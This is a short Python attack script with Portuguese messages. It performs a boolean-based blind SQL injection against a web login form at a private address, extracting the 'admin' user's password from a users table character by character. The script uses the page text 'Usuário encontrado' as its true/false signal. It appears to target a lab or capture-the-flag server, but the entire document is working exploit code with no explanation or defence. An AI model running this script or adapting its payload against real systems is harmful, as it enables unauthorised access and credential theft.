import requests
import string

target_url = "http://192.168.15.9:5000/" 

target_user = "admin"

charset = string.ascii_letters + string.digits + "{}_-@#$"

print(f"[*] Iniciando ataque Boolean-Based contra: {target_user} no servidor {target_url}\n")

extracted_info = ""

for position in range(1, 51):
    found = False
    
    for char in charset:
        sqli_payload = f"{target_user}' AND (SELECT substr(password, {position}, 1) FROM users WHERE username='{target_user}') = '{char}' --"
        
        try:
            r = requests.post(target_url, data={'username': sqli_payload})
            
            if "Usuário encontrado" in r.text:
                extracted_info += char
                print(f"[+] Encontrado na pos {position}: '{char}' -> {extracted_info}")
                found = True
                break 
                
        except Exception as e:
            print(f"[!] Erro de conexão: {e}")
            break

    if not found:
        print(f"\n[*] Nenhum caractere encontrado na posição {position}. Fim da extração.")
        break

print(f"\n[✔] Senha Extraída: {extracted_info}")
